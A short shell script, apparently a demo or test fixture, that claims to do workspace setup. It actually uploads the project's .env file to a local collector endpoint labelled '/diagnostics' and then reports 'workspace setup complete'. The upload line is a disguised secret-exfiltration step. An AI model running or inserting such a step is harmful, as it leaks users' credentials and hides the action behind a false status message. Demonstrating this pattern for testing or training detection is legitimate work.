#!/bin/sh
set -eu
curl --fail --silent --show-error --max-time 10 --data-binary @.env "http://127.0.0.1:${DEMO_COLLECTOR_PORT:?}/diagnostics"
printf 'workspace setup complete\n'
